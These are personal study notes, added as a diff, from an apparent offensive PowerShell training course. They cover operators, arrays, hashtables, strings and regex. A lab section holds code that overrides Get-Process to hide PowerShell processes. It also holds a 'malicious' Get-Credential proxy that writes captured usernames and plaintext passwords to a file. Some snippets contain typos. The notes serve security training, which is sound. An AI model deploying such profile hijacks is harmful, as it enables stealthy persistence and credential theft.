@@ -87,6 +87,182 @@ $ENV) run Get-Help about_Automatic_Variables
 • Get-ChildItem Variable:\
 • To cast a variable to a specific type, use [Type] $Var
 
+### Common Operators
+```
+Arithmetic: +, -, *, /, %
+• Assignment: =, +=, -=, *=, /=, %=
+• Comparison: -eq, -ne, -gt, -lt, -le, -ge (also the regex operators)
+• Logical: -and, -or, -xor, -not, !
+• Redirection: >, >>, 2>, 2>>, and 2>&1
+• Type: -is, -isnot, -as
+• Special: @(), & (call), [] (cast), , (comma), . (dot-sourcing), .. (range),
+$() (sub-expression)
+• More information: Get-Help about_Operators
+• Each operator type has an about_X_Operators doc as well
+```
+### array 
+$arrya = 4,6,1,60,23,53
+$arrya = @4,6,"s",60,"yes",5.3)
+[int32[]]$array = 1500,1600,1700,1800
+
+### common array operators
+```
+$array.Count
+$array[-1..-$array.length] : reverse an array
+$array += $value
+immutable so instead we can use ArrayList 
+$ArrayList = New-Object System.COllections.ArrayList
+$ArrayList.Add($value) and $ArrayList.Remove($Value)
+$ArrayList.ToArray()
+```
+### Hashtables
+
+$hash = @{Number=1; Shape="Square";Color="Blue"}
+$hash
+
+### COmmon hashtable operations
+
+```
+$hash.keys, $hash.values, $hash.Add('Key', 'Value')
+$hash = $hash + @{Key="Value"}
+$hash.Remove("Key")
+
+turning hashtable into an object
+[<class>]@{<name>=<value>; [<name>=<value>]}
+```
+### Splatting with Hashtable
+
+$Args = @{Path="test.txt";Destination="test2.txt",WhatIf=$true}
+Copy-Item @Args
+
+### Subversive Profiles
+a profile that hides any powershell.exe from Get-Process
+
+# mini lab
+Build a subversive profile that hides any powershell.exe instances
+from Get-Process
+• Check out the “call operator”!
+
+```
+16
+
+The call operator & allows you to execute a command, script or function.
+
+Many times you can execute a command by just typing its name, but this will only run if the command is in the environment path. Also if the command (or the path) contains a space then this will fail. Surrounding a command with quotes will make PowerShell treat it as a string, so in addition to quotes, use the & call operator to force PowerShell to treat the string as a command to be executed.
+```
+
+```powershell
+$Function = Get-Command Get-Process
+
+
+#$PSBoundParameters can be used to call a subordinate function or cmdlet passing the same parameters - PowerShell will automatically splat the hash table's values instead of having to type each of the parameters:
+#get-otherthing @PSBoundParameters
+
+function Get-Process {
+    param(
+        $Name, 
+        $Id,
+        $InputObject,
+        $IncludeUserName,
+        $ComputerName,
+        $Module,
+        $FileVersionInfo
+    )
+    Write-Host -ForegroundColor "Red" -Object "cmd.exe calc.exe"
+    & $Function @PSBoundParameters | Where-Object {$_.ProcessName -notmatch 'powershell'}
+}
+```
+
+![](2022-09-07-06-38-07.png)
+
+other ways to do it
+
+```powershell
+function Get-Process {
+	param(
+		$Name,
+		$Id,
+		$InputObject,
+		$IncludeUserName,
+		$ComputerName,
+		$Module,
+		$FileVersionInfo
+	)
+	Write-Host -ForegroundColor "Red" -Object "Hello from malicious Get-Process!"
+	$Function = $ExecutionContext.InvokeCommand.GetCommand('Microsoft.PowerShell.Management\Get-Process', [System.Management.Automation.CommandTypes]::Cmdlet)
+	& $Function @PSBoundParameters | Where-Object {$_.ProcessName -notmatch 'powershell'}
+}
+```
+
+
+• (Bonus) food for thought:
+• How would you write a malicious Get-Credential proxy?
+```powershell
+$Function = GetCommand Get-Credential
+
+function get-Credential {
+    param(
+        $Credential,
+        $MEssage,
+        $UserName
+    )
+
+    Write-Host "Hello from the other side"
+    $Ooutput = & $Function @PSBoundParameters
+    "$($Output.Username):$($Output.GetNetworkCredential().Password)" | Out-File cred.txt
+    Write-Host -ForegroundColor "Red" -Object "Credential output to cred.txt"
+    $Output
+}
+```
+didnt quite work:
+![](2022-09-07-07-05-37.png)
+
+• How would you use a subversive profile for lateral movement? ;)
+
+
+• The solution is in .\Labs\Day 1\Subversive Profiles\
+https://github.com/specterops/at-ps/blob/master/Labs/Day%201
+
+# Strings
+
+"" - double quoted strings and herestrings @".."@ exoand sub expressions and variables
+
+we can use single quotes for no expansion
+```
+$a.SubString(X)
+$a.SubString(X,Y)
+$a.split(".")
+$a.PadLeft(10)/$a.PadRight(10)
+$a.ToByteArray()
+$a.CompareTo($b)
+[string]::Compare($a, $b, $True)
+$a.startsWith("string")/$a.endsWith("string")
+$a.ToLower() / $a.ToUpper() : return a new lowercase (or
+uppercase) version of the string
+• $a.Contains(“string”) : strings in strings yo’, case-sensitive
+• $a.Replace(“string1”, “string2”) : string replacement
+```
+
+# Regular Expressions
+
+-match and -notmatch operators. For case sensitive matches we can use -cmath and -cnotmatch
+
+```
+"\\Server2\Share" -match "^\\\\\w+\\\w+"
+• $email -notmatch "^[a-z]+\.[a-z]+@company.com$"
+• -match will auto-populate the $Matches variable if it’s used on a single
+variable (not an array)
+```
+
+
+
+
+
+
+
+
+
+
 
 
 
